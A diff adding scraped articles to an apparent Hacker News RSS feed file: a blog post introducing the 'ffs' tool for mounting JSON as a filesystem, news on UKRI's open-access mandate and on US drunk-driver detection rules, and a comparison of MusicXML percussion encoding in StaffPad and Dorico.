@@ -23549,5 +23549,529 @@ Jim Hall</td>
       <pubDate>Sun, 08 Aug 2021 11:06:08 +0000</pubDate>
       <source>https://tesseract.projectnaptha.com/</source>
     </item>
+    <item>
+      <title>Processing Semi-Structured Data in the Unix Shell</title>
+      <link>http://www.weaselhat.com/2021/06/29/processing-semi-structured-data-in-the-unix-shell/</link>
+      <description></description>
+      <content:encoded><![CDATA[<div id="readability-page-1" class="page"><article id="post-936">	
+		<!-- .entry-header -->
+
+	<div>
+		
+<p>The Unix shell is incredibly powerful. I use it routinely for simple tasks (moving files around), routine work (grading scripts), and in my development process (building, deploying, etc.). When I’m working with text, the shell and its ecosystem is excellent: patching together <code>cat</code>, <code>find</code>, <code>grep</code>, <code>sed</code>, <code>tr</code>, and <code>cut</code> with shell pipelines and redirections is a convenient, expressive, and fast way to inspect and edit files.</p>
+
+
+
+<p>But my shell toolchain is much less helpful when working with <a href="https://en.m.wikipedia.org/wiki/Semi-structured_data">semi-structured data</a>, like JSON and YAML. Folks have made wonderful contributions to the shell ecosystem to help—tools like <a href="https://stedolan.github.io/jq/">jq</a> and <a href="https://github.com/tomnomnom/gron">gron</a>. These two tools provide new languages for manipulating JSON. It may be embarrassing to admit for a programming languages researcher, but… I’m kind of maxed out on new languages.</p>
+
+
+
+<p>So I built a new tool that lets you use your usual shell tools to work with modern file formats: <a href="https://mgree.github.io/ffs/"><code>ffs</code>, the <code>f</code>ile <code>f</code>ile<code>s</code>ystem</a>.</p>
+
+
+
+<figure><a href="http://www.weaselhat.com/wp-content/uploads/2021/06/inplace_demo.gif"><img loading="lazy" width="640" height="318" src="http://www.weaselhat.com/wp-content/uploads/2021/06/inplace_demo.gif" alt="A GIF showing the following shell interaction, editing JSON in place.
+
+~/ffs/demo $ echo &#39;{}&#39; &gt;demo.json
+~/ffs/demo $ ffs -i demo.json &amp;
+[1] 56827
+~/ffs/demo $ cd demo
+~/ffs/demo/demo $ echo 47 &gt;favorite_number
+~/ffs/demo/demo $ mkdir likes
+~/ffs/demo/demo $ echo true &gt;likes/dogs
+~/ffs/demo/demo $ echo false &gt;likes/cats
+~/ffs/demo/demo $ touch mistakes
+~/ffs/demo/demo $ echo Michael Greenberg &gt;name
+~/ffs/demo/demo $ echo https://mgree.github.io &gt;website
+~/ffs/demo/demo $ cd ..
+~/ffs/demo $ umount demo
+~/ffs/demo $ 
+[1]+  Done                    ffs -i demo.json
+~/ffs/demo $ cat demo.json 
+{&#34;favorite_number&#34;:47,&#34;likes&#34;:{&#34;cats&#34;:false,&#34;dogs&#34;:true},&#34;mistakes&#34;:null,&#34;name&#34;:&#34;Michael Greenberg&#34;,&#34;website&#34;:&#34;https://mgree.github.io&#34;}~/ffs/demo $ 
+~/ffs/demo $"/></a><figcaption>Editing JSON in place using ffs.</figcaption></figure>
+
+
+
+<p>ffs lets you mount semi-structured data as a filesystem: objects and lists correspond to directories, while other types correspond to regular files. You can mount a file in one format, edit the filesystem, and write it back in another.</p>
+
+
+
+<p>All you need to run ffs is FUSE, a kernel module that supports userspace filesystem. You’ll want <a href="https://github.com/libfuse/libfuse">libfuse</a> on Linux, or <a href="https://osxfuse.github.io/">macFUSE</a> on macOS. <a href="https://github.com/mgree/ffs/releases">Download a binary</a> and play around!</p>
+			</div><!-- .entry-content -->
+
+	
+	<!-- .entry-footer -->
+</article></div>]]></content:encoded>
+      <pubDate>Sun, 08 Aug 2021 06:33:02 +0000</pubDate>
+      <source>http://www.weaselhat.com/2021/06/29/processing-semi-structured-data-in-the-unix-shell/</source>
+    </item>
+    <item>
+      <title>Major U.K. science funder to require grantees to make papers immediately free</title>
+      <link>https://www.sciencemag.org/news/2021/08/major-uk-science-funder-require-grantees-make-papers-immediately-free-all</link>
+      <description></description>
+      <content:encoded><![CDATA[<div id="readability-page-1" class="page"><div>              <!--<div class="article__body">-->
+              
+              
+              
+              <div>
+  
+  
+      <figure>
+  <p>  </p>
+      <figcaption>
+      <p><span>
+            
+  
+      DAVIDE BONAZZI/SALZMAN ART  
+          </span>
+              </p>
+    </figcaption>
+  </figure>
+  
+</div>
+  
+  <header>
+
+    
+          
+    
+          
+      </header>
+
+  
+  
+  
+      <p>The United Kingdom currently has one of the highest rates of open-access publication in the world, with many researchers posting their research papers on websites that make them publicly available for free. But the country’s leading funding agency today announced a new policy that will push open access even further by mandating that all research it funds must be freely available for anyone to read upon publication.</p>
+
+<p>The policy by the funder, UK Research and Innovation (UKRI), will expand on existing rules covering all research papers produced from its £8 billion in annual funding. About three-quarters of papers recently published from U.K. universities are open access, and UKRI’s current policy gives scholars two routes to comply: Pay journals for “gold” open access, which makes a paper free to read on the publisher’s website, or choose the “green” route, which allows them to deposit a near-final version of the paper on a public repository, after a waiting period of up to 1 year. Publishers have insisted that an embargo period is necessary to prevent the free papers from peeling away their subscribers.</p>
+
+<p>But starting in April 2022, that yearlong delay will no longer be permitted: Researchers choosing green open access must deposit the paper immediately when it is published. And publishers won’t be able to hang on to the copyright for UKRI-funded papers: The agency will require that the research it funds—with some minor exceptions—be published with a Creative Commons Attribution license (known as CC-BY) that allows for free and liberal distribution of the work.</p>
+  
+  
+  
+      <p>UKRI developed the new policy because “publicly funded research should be available for public use by the taxpayer,” says Duncan Wingham, the funder’s executive champion for open research. The policy falls closely in line with those issued by other major research funders, including the nonprofit Wellcome Trust—one of the world’s largest nongovernmental funding bodies—and the European Research Council.</p>
+
+<p>The move also brings UKRI’s policy into alignment with Plan S, an effort led by European research funders—including UKRI—to make academic literature freely available to read. Coalition S, the funders’ group, is “delighted” with the policy, says Executive Director Johan Rooryck. UKRI is a funding heavyweight within Europe, he says, and its push for open access shows there is a “worldwide movement” among big research funders in the same direction. “We are hoping that this will be an example for many other large funders in the world,” Rooryck says, including in China, Japan, and the United States.</p>
+
+<p>Although the requirement for zero-embargo green open access is significant, the policy is still “evolutionary rather than revolutionary,” says David Prosser, executive director of the library consortium Research Libraries UK. It clears up some confusion about when UKRI will pay the fees that journals charge for gold open access, he says: never for journals that offer a mix of paywalled and open-access content, unless the journal is part of an agreement to transition to exclusively open access for all research papers. (More than half of U.K. papers are covered by transitional agreements, according to UKRI.) “This will make it easier for institutions, for authors, and for publishers to know where they stand,” Prosser says. UKRI will nearly double the funding it provides for supporting open access—including gold open-access fees–from £24 million to £47 million per year.</p>
+
+<p>UKRI says it will unveil more details of the policy in November. It has not yet said, for example, whether it will fund gold open-access fees for journals—including <em>Nature</em>—that have made some open-access commitments but are not covered by a full transitional agreement approved by Jisc, a nonprofit U.K. group that negotiates journal subscriptions on behalf of universities. With implementation of the policy still nearly a year away, UKRI thinks there will be enough time that “there will be sufficient, affordable, sustainable choice” for researchers, Wingham says.</p>
+
+<p>Publishers have resisted the new requirements. The Publishers Association, a member organization for the U.K. publishing industry, circulated a document saying the policy would introduce confusion for researchers, threaten their academic freedom, undermine open access, and leave many researchers on the hook for fees for gold open access—which it calls the only viable route for researchers. The publishing giant Elsevier, in a letter sent to its editorial board members in the United Kingdom, said it had been working to shape the policy by lobbying UKRI and the U.K. government, and encouraged members to write in themselves.</p>
+
+<p>Elsevier directed requests for comment on the new policy to the Publishers Association, which released a statement calling green open access unsustainable, particularly for small publishers. “When versions of articles are made available too soon, this undermines the need to subscribe [to journals],” wrote a spokesperson, Amy Price, in an email to <em>Science</em>. It remains to be seen whether some publishers will refuse to publish papers by authors who opt to immediately post a green version of their paper; Price’s email did not respond to a question about that possibility.</p>
+
+<p>It would not be in the interest of publishers to refuse to publish these green open-access papers, Rooryck says, because the public repository version ultimately drives publicity for publishers. And even with a paper immediately deposited in a public repository, the final “version of record” published behind a paywall will still carry considerable value, Prosser says. Publishers who threaten to reject such papers, Rooryck believes, are simply “saber rattling and posturing.”</p>
+  
+</div></div>]]></content:encoded>
+      <pubDate>Sun, 08 Aug 2021 11:31:37 +0000</pubDate>
+      <source>https://www.sciencemag.org/news/2021/08/major-uk-science-funder-require-grantees-make-papers-immediately-free-all</source>
+    </item>
+    <item>
+      <title>Drunk-driver detectors for cars mandated in infrastructure bill</title>
+      <link>https://www.autoblog.com/2021/08/03/infrastructure-bill-cars-drunk-driving-detection-kids-in-back-seat/</link>
+      <description></description>
+      <content:encoded><![CDATA[<div id="readability-page-1" class="page"><div>
+		<div itemprop="articleBody">
+						<p><em>U.S. Rep. Debbie Dingell, D-Mich., has pushed for the inclusion of anti-drunk-driver technology for years. (Reuters)</em></p> 
+ 
+<p>New cars will be required to have technology to detect <a href="https://www.autoblog.com/tag/drunk+driving/" data-ylk="elm:context_link;itc:0;pos:1;sec:donut-hole;cpos:0;">drunk drivers</a> and a system to keep children from being accidentally left in vehicles on hot days under a series of long-sought safety measures included in the infrastructure bill awaiting a vote in the U.S. Senate.</p> 
+<p>Other provisions included in the 2,702-page bill are a mandate for automatic emergency <a href="https://www.autoblog.com/tag/brakes/" data-ylk="elm:context_link;itc:0;pos:1;sec:donut-hole;cpos:1;">braking</a> and crash avoidance systems for <a href="https://www.autoblog.com/research/" data-ylk="elm:context_link;itc:0;pos:1;sec:donut-hole;cpos:2;">new cars</a>, and rear guards for semitrailer <a href="https://www.autoblog.com/truck/" data-ylk="elm:context_link;itc:0;pos:1;sec:donut-hole;cpos:3;">trucks</a> to keep the passenger compartments of cars from being crushed in rear-impact collisions.</p> 
+<p>Jason Levine, executive director of the <a href="https://www.autoblog.com/tag/center+for+auto+safety/" data-ylk="elm:context_link;itc:0;pos:1;sec:donut-hole;cpos:4;">Center for Auto Safety</a>, which lobbies for more stringent <a href="https://www.autoblog.com/category/safety/" data-ylk="elm:context_link;itc:0;pos:1;sec:donut-hole;cpos:5;">auto safety</a> rules, applauded the inclusion of the measures.</p> 
+<p>“There is little question our nation is long overdue for critical updates to our infrastructure, especially when it comes to vehicle safety and the rising tide of preventable car crash deaths,” he said.</p> 
+<p>Although people in the U.S. drove less in 2020 because of the pandemic, an estimated 38,680 people died in traffic crashes, which is the highest number of annual deaths since 2007, according to a release from the <a href="https://www.autoblog.com/tag/nhtsa/" data-ylk="elm:context_link;itc:0;pos:1;sec:donut-hole;cpos:6;">National Highway Traffic Safety Administration</a> in June. The number of U.S. traffic deaths rose by 7.2% from the previous year, despite the 13.2% decrease in vehicle miles traveled.</p> 
+<p>Backers say the anti-drunk driving provisions in the measure would drastically reduce the number of deaths that occur on U.S. roads.</p> 
+<p>“This is the most significant rule-making in <a href="https://www.autoblog.com/tag/nhtsa/" data-ylk="elm:context_link;itc:0;pos:1;sec:donut-hole;cpos:7;">NHTSA</a>’s history,” Stephanie Manning, government affairs officer for Mothers Against Drunk Driving, said. “Every year we wait, thousands of people will die.”</p> 
+<p>The provision mirrors legislation that Rep. Debbie Dingell, D-Mich., has championed for several years. It orders NHTSA to study the feasibility of various technologies and establish a final rule within three years mandating some form of anti-drunk driving technology.</p> 
+<h2>Drunk drivers</h2> 
+<p>Among the systems that have been studied are ones that monitor a driver for signs of distracted, impaired or fatigued driving. One uses sensors that scan drivers’ eyes for signs that are similar to ones that police officers look for when they suspect impairment during traffic stops.</p> 
+<p>“We can’t wait any longer to make our roads safer from <a href="https://www.autoblog.com/tag/drunk+driving/" data-ylk="elm:context_link;itc:0;pos:1;sec:donut-hole;cpos:8;">drunk driving</a> accidents,” Dingell said in a statement. “The inclusion of my bill in the bipartisan infrastructure package will help incentivize the development and implementation of technology to stop drunk driving once and for all and save lives.”</p> 
+<p>A measure to combat deaths of children inadvertently left in a car on hot days calls for a “door logic” alert that reminds a driver that a rear door had been opened and closed prior to the engine starting. The alert tells the driver when the engine is turned off to check the back seat.</p> 
+<p>Janette Fennell, president of Kids and Car Safety, said she wished the bill had gone further to prevent the accidental deaths of children. Since 1990, she said, more than 1,000 children had died in hot cars.</p> 
+<p>“The Senate version is only requesting a reminder system that does not detect anything,” Fennell said. “It does not let you know if there is an actual child in the back seat.”</p> 
+<h2>More is needed</h2> 
+<p>Senator Ed Markey, a Massachusetts Democrat who has been advocating for more auto safety legislation, said that variations of bills he has introduced are included in the package, including ones related to seat-back failure, <a href="https://www.autoblog.com/tag/distracted+driving/" data-ylk="elm:context_link;itc:0;pos:1;sec:donut-hole;cpos:9;">distracted driving</a> and <a href="https://www.autoblog.com/recalls/" data-ylk="elm:context_link;itc:0;pos:1;sec:donut-hole;cpos:10;">recalls</a>, but he will still be pushing for more.</p> 
+<p>“We must still fight to improve this bill before it becomes law,” Markey said. “That’s why I will be offering several amendments to strengthen my existing safety provisions and remove dangerous proposals that could undermine some of the rules we already have on the books.”</p> 
+<p>Any changes to the bill will be difficult and require broad agreement. Amendments will need 60 votes to pass.</p> 
+<p>Cathy Chase, president of Advocates for Highway and Auto Safety, said it is important for Congress to address auto safety, but she said she wishes the bipartisan infrastructure measure would have gone even further.</p> 
+<p>“The past year and a half has been exceptionally deadly for motorists and other road users,” Chase said in a statement. “This alarming fatal upward trend must be met with the advancement of available, game-changing safety technologies and other upgrades.”</p></div>
+				</div></div>]]></content:encoded>
+      <pubDate>Sun, 08 Aug 2021 13:36:11 +0000</pubDate>
+      <source>https://www.autoblog.com/2021/08/03/infrastructure-bill-cars-drunk-driving-detection-kids-in-back-seat/</source>
+    </item>
+    <item>
+      <title>MusicXML and Percussion Notation</title>
+      <link>https://v5.chriskrycho.com/journal/musicxml-and-percussion-redux/</link>
+      <description></description>
+      <content:encoded><![CDATA[<img src="https://rss.markdessain.com/feeds/hackernews/https___v5_chriskrycho_com_journal_musicxml-and-percussion-redux_/image.jpg" /> 
+<div id="readability-page-1" class="page"><div>
+      
+<p>
+      <b><a href="https://v4.chriskrycho.com/2018/assumed-audiences.html">Assumed Audience</a>:</b>
+      People interested in the nitty-gritty details of music notation software transfer formats.
+
+   </p><p>Last weekend I <a href="https://v5.chriskrycho.com/journal/staffpad-to-dorico-via-musicxml-alas-no/">noted</a> that I had hit a number of frustrations in trying to jump back and forth between <a href="https://www.staffpad.net">StaffPad</a> and <a href="https://new.steinberg.net/dorico/">Dorico</a>, because the Music<abbr title="eXtensible Markup Language">XML</abbr> handoff between the two was frustrating particularly around percussion — and, spoilers, my orchestral writing makes pretty thorough use of percussion! While I’m still somewhat up in the air where I’ll ultimately land on one or the other as a primary tool — <a href="https://www.scoringnotes.com/podcast/the-history-and-future-of-dorico-for-ipad/">recent news from Dorico</a> having made that a yet more interesting consideration! — but in the meantime I figured it would be interesting to dig into how and why the two differ.</p>
+<p>For this post, I’m going to dig into the major ways the applications differ in how they represent a single percussion instrument: Wood Blocks. I picked Wood Blocks because they’re a bit move involved than something like a bass drum or snare drum:</p>
+<ul>
+<li>
+<p>They are categorized as unpitched percussion, because they do not have <em>definite</em> pitches, but they do have <em>distinct</em> pitches across the blocks.</p>
+</li>
+<li>
+<p>They are always represented as some kind of multiline staff. However, different tools present that staff differently!</p>
+<ul>
+<li>
+<p>StaffPad uses by a traditional 5-line staff:</p>
+  
+</li>
+<li>
+<p>Dorico uses a line-per-block percussion-style staff:</p>
+  
+</li>
+</ul>
+</li>
+<li>
+<p>They are not a collection of <em>totally different</em> percussion instruments all grouped together as in a drum kit staff, but the blocks do also have distinct elements to strike in a way that differs from e.g. a piano or a glockenspiel.</p>
+</li>
+</ul>
+
+<p>This set of differences means that looking at wood blocks will show us most of what we need to know about the underlying differences in the programs’ representations of percussion. We <em>can</em> safely generalize from what we’ll see below!</p>
+<h2 id="presentation" tabindex="-1"><a href="#presentation">Presentation</a></h2>
+<p>First, notice again the two different visual representations of the instrument:</p>
+<p>StaffPad:</p>
+<p></p><p>Dorico:</p>
+<p></p><p>This gives us our first hint of how the two programs <em>model</em> the instruments differently: StaffPad is treating this as an unpitched instrument in some ways (notice the two-thick-bars start of the staff), but using a pitched-instrument-style staff to represent it. Dorico is doing something totally different, with a single line per block — as if it is representing each wood block as a distinct instrument, but grouped together into a single visual representation. As it turns out, that visual difference (apparent here as it is not necessarily in other, simpler percussion instruments we might have looked at) is <em>exactly</em> what is going on under the hood.</p>
+<p>What’s more, I have actually cheated a bit here to make these appear more similar than they normally would. By default, Dorico actually presents these with the individual blocks named:</p>
+<p></p><p>I went out of my way to create a <a href="https://steinberg.help/dorico_pro/v3.5/en/dorico/topics/setup_mode/setup_mode_percussion_kits_grid_groups_creating_t.html">Group</a> to get the notation as close as possible to StaffPad’s to highlight the difference in presentation of the musical staves, but with the default instrument naming in view it becomes that much more clear: Dorico thinks of each block as a distinct item on unpitched lines, whereas StaffPad thinks of them as a single instrument with unpitched blocks mapped to pitched stave lines, and they present them accordingly.</p>
+<p>So how does that translate into the Music<abbr>XML</abbr> each program generates?</p>
+<h2 id="musicxml-representation" tabindex="-1"><a href="#musicxml-representation">MusicXML Representation</a></h2>
+<p>There are a couple points of interest here. One is how the instruments themselves are defined. Both programs follow the Music<abbr>XML</abbr> spec here, but they represent the instrument quite differently — albeit in a rather unsurprising way, given what we saw above!</p>
+<p>Here’s how StaffPad defines the Wood Blocks instrument:</p>
+<pre><code><span>&lt;<span>part-list</span>&gt;</span>
+  <span>&lt;<span>score-part</span> <span>id</span>=<span>&#34;P1&#34;</span>&gt;</span>
+    <span>&lt;<span>part-name</span>&gt;</span>Wood Blocks<span>&lt;/<span>part-name</span>&gt;</span>
+    <span>&lt;<span>score-instrument</span> <span>id</span>=<span>&#34;P1-I1&#34;</span>&gt;</span>
+      <span>&lt;<span>instrument-name</span>&gt;</span>Wood Blocks<span>&lt;/<span>instrument-name</span>&gt;</span>
+      <span>&lt;<span>instrument-abbreviation</span>&gt;</span>W.Blocks<span>&lt;/<span>instrument-abbreviation</span>&gt;</span>
+      <span>&lt;<span>instrument-sound</span>&gt;</span>wood.wood-block<span>&lt;/<span>instrument-sound</span>&gt;</span>
+    <span>&lt;/<span>score-instrument</span>&gt;</span>
+  <span>&lt;/<span>score-part</span>&gt;</span>
+<span>&lt;/<span>part-list</span>&gt;</span>
+</code></pre>
+<p>And here’s how Dorico defines the Wood Blocks instrument:</p>
+<pre><code><span>&lt;<span>part-list</span>&gt;</span>
+  <span>&lt;<span>score-part</span> <span>id</span>=<span>&#34;P1&#34;</span>&gt;</span>
+    <span>&lt;<span>part-name</span>&gt;</span>Wood Blocks<span>&lt;/<span>part-name</span>&gt;</span>
+    <span>&lt;<span>score-instrument</span> <span>id</span>=<span>&#34;P1-X1&#34;</span>&gt;</span>
+      <span>&lt;<span>instrument-name</span>&gt;</span>Wood Block 1<span>&lt;/<span>instrument-name</span>&gt;</span>
+    <span>&lt;/<span>score-instrument</span>&gt;</span>
+    <span>&lt;<span>score-instrument</span> <span>id</span>=<span>&#34;P1-X2&#34;</span>&gt;</span>
+      <span>&lt;<span>instrument-name</span>&gt;</span>Wood Block 2<span>&lt;/<span>instrument-name</span>&gt;</span>
+    <span>&lt;/<span>score-instrument</span>&gt;</span>
+    <span>&lt;<span>score-instrument</span> <span>id</span>=<span>&#34;P1-X3&#34;</span>&gt;</span>
+      <span>&lt;<span>instrument-name</span>&gt;</span>Wood Block 3<span>&lt;/<span>instrument-name</span>&gt;</span>
+    <span>&lt;/<span>score-instrument</span>&gt;</span>
+    <span>&lt;<span>score-instrument</span> <span>id</span>=<span>&#34;P1-X4&#34;</span>&gt;</span>
+      <span>&lt;<span>instrument-name</span>&gt;</span>Wood Block 4<span>&lt;/<span>instrument-name</span>&gt;</span>
+    <span>&lt;/<span>score-instrument</span>&gt;</span>
+    <span>&lt;<span>score-instrument</span> <span>id</span>=<span>&#34;P1-X5&#34;</span>&gt;</span>
+      <span>&lt;<span>instrument-name</span>&gt;</span>Wood Block 5<span>&lt;/<span>instrument-name</span>&gt;</span>
+    <span>&lt;/<span>score-instrument</span>&gt;</span>
+  <span>&lt;/<span>score-part</span>&gt;</span>
+<span>&lt;/<span>part-list</span>&gt;</span>
+</code></pre>
+<p>The key things to notice here:</p>
+<ul>
+<li>
+<p>StaffPad and Dorico both treat this instrument as a single <code>score-part</code>, and in fact it happens to have a matching part <abbr title="identifier">ID</abbr></p>
+</li>
+<li>
+<p>In StaffPad, the Wood Blocks are represented as a <em>single</em> <code>score-instrument</code> within that top-level <code>score-part</code>. In Dorico, each wood block is a separate <code>score-instrument</code> and <code>instrument-name</code> within the <code>score-part</code>.</p>
+</li>
+</ul>
+<p>The result is what I found last week: The different <em>lines</em> from percussion instruments from StaffPad ended up mapped into multiple different <em>instruments</em> in Dorico.</p>
+<p>This continues as we dig into the <code>&lt;part&gt;</code> section of the Music<abbr>XML</abbr> file. A <code>&lt;part&gt;</code> represents each <em>musical part</em> in the score, and holds all the measures which belong to that part. If we look at how the two programs represent the parts, we can see more of why it’s difficult to translate from one to the other.</p>
+<p>StaffPad:</p>
+<pre><code><span>&lt;<span>part</span> <span>id</span>=<span>&#34;P1&#34;</span>&gt;</span>
+  <span>&lt;<span>measure</span> <span>number</span>=<span>&#34;1&#34;</span>&gt;</span>
+    <span>&lt;<span>attributes</span>&gt;</span>
+      <span>&lt;<span>divisions</span>&gt;</span>192<span>&lt;/<span>divisions</span>&gt;</span>
+      <span>&lt;<span>key</span>&gt;</span>
+        <span>&lt;<span>fifths</span>&gt;</span>0<span>&lt;/<span>fifths</span>&gt;</span>
+        <span>&lt;<span>mode</span>&gt;</span>major<span>&lt;/<span>mode</span>&gt;</span>
+      <span>&lt;/<span>key</span>&gt;</span>
+      <span>&lt;<span>time</span>&gt;</span>
+        <span>&lt;<span>beats</span>&gt;</span>4<span>&lt;/<span>beats</span>&gt;</span>
+        <span>&lt;<span>beat-type</span>&gt;</span>4<span>&lt;/<span>beat-type</span>&gt;</span>
+      <span>&lt;/<span>time</span>&gt;</span>
+      <span>&lt;<span>staves</span>&gt;</span>1<span>&lt;/<span>staves</span>&gt;</span>
+      <span>&lt;<span>clef</span>&gt;</span>
+        <span>&lt;<span>sign</span>&gt;</span>percussion<span>&lt;/<span>sign</span>&gt;</span>
+      <span>&lt;/<span>clef</span>&gt;</span>
+      <span>&lt;<span>staff-details</span>&gt;</span>
+        <span>&lt;<span>staff-lines</span>&gt;</span>5<span>&lt;/<span>staff-lines</span>&gt;</span>
+      <span>&lt;/<span>staff-details</span>&gt;</span>
+      <span>&lt;<span>transpose</span>&gt;</span>
+        <span>&lt;<span>diatonic</span>&gt;</span>0<span>&lt;/<span>diatonic</span>&gt;</span>
+        <span>&lt;<span>chromatic</span>&gt;</span>0<span>&lt;/<span>chromatic</span>&gt;</span>
+        <span>&lt;<span>octave-change</span>&gt;</span>0<span>&lt;/<span>octave-change</span>&gt;</span>
+      <span>&lt;/<span>transpose</span>&gt;</span>
+    <span>&lt;/<span>attributes</span>&gt;</span>
+    
+  <span>&lt;/<span>measure</span>&gt;</span>
+<span>&lt;/<span>part</span>&gt;</span>
+</code></pre>
+<p>Dorico:</p>
+<pre><code><span>&lt;<span>part</span> <span>id</span>=<span>&#34;P1&#34;</span>&gt;</span>
+  <span>&lt;<span>measure</span> <span>number</span>=<span>&#34;1&#34;</span>&gt;</span>
+    <span>&lt;<span>attributes</span>&gt;</span>
+      <span>&lt;<span>divisions</span>&gt;</span>4<span>&lt;/<span>divisions</span>&gt;</span>
+      <span>&lt;<span>key</span> <span>number</span>=<span>&#34;1&#34;</span>&gt;</span>
+        <span>&lt;<span>fifths</span>&gt;</span>0<span>&lt;/<span>fifths</span>&gt;</span>
+        <span>&lt;<span>mode</span>&gt;</span>major<span>&lt;/<span>mode</span>&gt;</span>
+      <span>&lt;/<span>key</span>&gt;</span>
+      <span>&lt;<span>time</span>&gt;</span>
+        <span>&lt;<span>beats</span>&gt;</span>4<span>&lt;/<span>beats</span>&gt;</span>
+        <span>&lt;<span>beat-type</span>&gt;</span>4<span>&lt;/<span>beat-type</span>&gt;</span>
+      <span>&lt;/<span>time</span>&gt;</span>
+      <span>&lt;<span>staves</span>&gt;</span>1<span>&lt;/<span>staves</span>&gt;</span>
+      <span>&lt;<span>clef</span> <span>number</span>=<span>&#34;1&#34;</span>&gt;</span>
+        <span>&lt;<span>sign</span>&gt;</span>percussion<span>&lt;/<span>sign</span>&gt;</span>
+      <span>&lt;/<span>clef</span>&gt;</span>
+    <span>&lt;/<span>attributes</span>&gt;</span>
+    
+  <span>&lt;/<span>measure</span>&gt;</span>
+<span>&lt;/<span>part</span>&gt;</span>
+</code></pre>
+<p>The first thing to notice is in the <code>staff-details</code> definition. Here’s a table showing a quick comparison:</p>
+<table>
+<thead>
+<tr>
+<th><em>Element</em></th>
+<th><strong>StaffPad</strong></th>
+<th><strong>Dorico</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>clef</code></td>
+<td><code>percussion</code></td>
+<td><code>percussion</code></td>
+</tr>
+<tr>
+<td><code>staves</code></td>
+<td><code>1</code></td>
+<td><code>1</code></td>
+</tr>
+<tr>
+<td><code>staff-lines</code></td>
+<td><code>5</code></td>
+<td>N/A</td>
+</tr>
+<tr>
+<td><code>transpose</code></td>
+<td>default values</td>
+<td>N/A</td>
+</tr>
+</tbody>
+</table>
+<p>Both use <code>percussion</code> for the <code>clef</code> (though Dorico explicitly also specifies a <a href="https://www.w3.org/2021/06/musicxml40/musicxml-reference/elements/clef/">clef <code>number</code> attribute</a> here), and set <code>staves</code> to <code>1</code> for this part, as we would expect: <em>most</em> instruments other than a piano, harp, or similar will be single-stave instruments. Beyond this, the two diverge substantially. StaffPad specifies <code>staff-lines</code> (within the <code>staff-details</code> container), but while it <em>could</em> choose to use the <code>line-detail</code> element to represent this exactly the way Dorico does… it <em>doesn’t</em> do that. Instead, it just specifies that there are five staff lines and moves on. Meanwhile, Dorico skips this entirely, because it has encoded the representation of the blocks already: in the <code>part-list</code> at the top. Likewise, Dorico doesn’t specify transposition at all, because it’s not relevant information for this instrument.</p>
+<p>This pattern continues when we look at individual notes. Let’s see how each program represents the first note, the lowest wood block. (The rest of the notes are basically identical, just with differences around which block is being struck.)</p>
+<p>First, StaffPad:</p>
+<pre><code><span>&lt;<span>note</span>&gt;</span>
+  <span>&lt;<span>pitch</span>&gt;</span>
+    <span>&lt;<span>step</span>&gt;</span>G<span>&lt;/<span>step</span>&gt;</span>
+    <span>&lt;<span>octave</span>&gt;</span>4<span>&lt;/<span>octave</span>&gt;</span>
+  <span>&lt;/<span>pitch</span>&gt;</span>
+  <span>&lt;<span>duration</span>&gt;</span>192<span>&lt;/<span>duration</span>&gt;</span>
+  <span>&lt;<span>voice</span>&gt;</span>1<span>&lt;/<span>voice</span>&gt;</span>
+  <span>&lt;<span>type</span>&gt;</span>quarter<span>&lt;/<span>type</span>&gt;</span>
+<span>&lt;/<span>note</span>&gt;</span>
+</code></pre>
+<p>Now Dorico:</p>
+<pre><code><span>&lt;<span>note</span>&gt;</span>
+  <span>&lt;<span>unpitched</span>&gt;</span>
+    <span>&lt;<span>display-step</span>&gt;</span>E<span>&lt;/<span>display-step</span>&gt;</span>
+    <span>&lt;<span>display-octave</span>&gt;</span>4<span>&lt;/<span>display-octave</span>&gt;</span>
+  <span>&lt;/<span>unpitched</span>&gt;</span>
+  <span>&lt;<span>duration</span>&gt;</span>4<span>&lt;/<span>duration</span>&gt;</span>
+  <span>&lt;<span>instrument</span> <span>id</span>=<span>&#34;P1-X5&#34;</span>/&gt;</span>
+  <span>&lt;<span>voice</span>&gt;</span>1<span>&lt;/<span>voice</span>&gt;</span>
+  <span>&lt;<span>type</span>&gt;</span>quarter<span>&lt;/<span>type</span>&gt;</span>
+  <span>&lt;<span>stem</span>&gt;</span>up<span>&lt;/<span>stem</span>&gt;</span>
+  <span>&lt;<span>staff</span>&gt;</span>1<span>&lt;/<span>staff</span>&gt;</span>
+<span>&lt;/<span>note</span>&gt;</span>
+</code></pre>
+<p>This time Dorico has far more information, but this is because it is encoding the wood blocks as genuinely unpitched and representing them as separate instruments, as we saw in the <code>part-list</code>. StaffPad is representing that first note as a pitched note: a<span></span> <span>“</span>G4”. Dorico is representing it as an unpitched note which apperas in a particular display note-and-octave of<span></span> <span>“</span>E4”. In this case, while StaffPad’s representation is not unknow of in published music, Dorico’s is definitely the more correct representation. You can also see that as a result of the choice to represent the blocks as individual instruments, Dorico needs to specify the <code>instrument</code> with an <code>id</code> attribute, and to specify the <code>staff</code> number on which the note is set. Those latter bits come<span></span> <span>“</span>for free” for StaffPad because of its choice to use a pitched representation of the note, but at the cost of a representation which has technically-incorrect semantics.</p>
+<p>It’s worth pausing here to note that a program could choose an alternative to Dorico’s representation which would <em>also</em> be correct. For example, you could use the <code>line-detail</code> element for the different lines within the stave, and take the same approach with <code>unpitched</code> notes and a <code>display-step</code> and <code>display-octave</code> as Dorico does. (The point is not that Dorico does it correctly — though I think it does — so much as that StaffPad does it slightly <em>incorrectly</em>.) But even so: the format is flexible enough that interop would be hard regardless. It is not obvious to me that Dorico’s import would work any better at all if StaffPad switched to the encoding I described here. This is just a hard problem!</p>
+<hr/>
+<p>If you’re curious and want to dig in further yourself, I‘ve uploaded both of the Music<abbr>XML</abbr> files used in this discussion; feel free to take a look:</p>
+<ul>
+<li><a href="https://cdn.chriskrycho.com/file/chriskrycho-com/images/dorico-staffpad-musicxml/Wood%20Blocks!%20%E2%80%93%20Staffpad.xml">StaffPad</a></li>
+<li><a href="https://cdn.chriskrycho.com/file/chriskrycho-com/images/dorico-staffpad-musicxml/Wood%20Blocks!%20%E2%80%93%20Dorico.xml">Dorico</a></li>
+</ul>
+<h2 id="so-what" tabindex="-1"><a href="#so-what">So what?</a></h2>
+<p>As we come here to the end, you might be wondering what the point of all of that was. Well, for one thing I hope it’s helpful for other people besides me to see exactly what’s going on in this musical interchange format. Understanding the complexities of these kinds of things can make it easier for people to sympathize with software developers: whose work is very hard!</p>
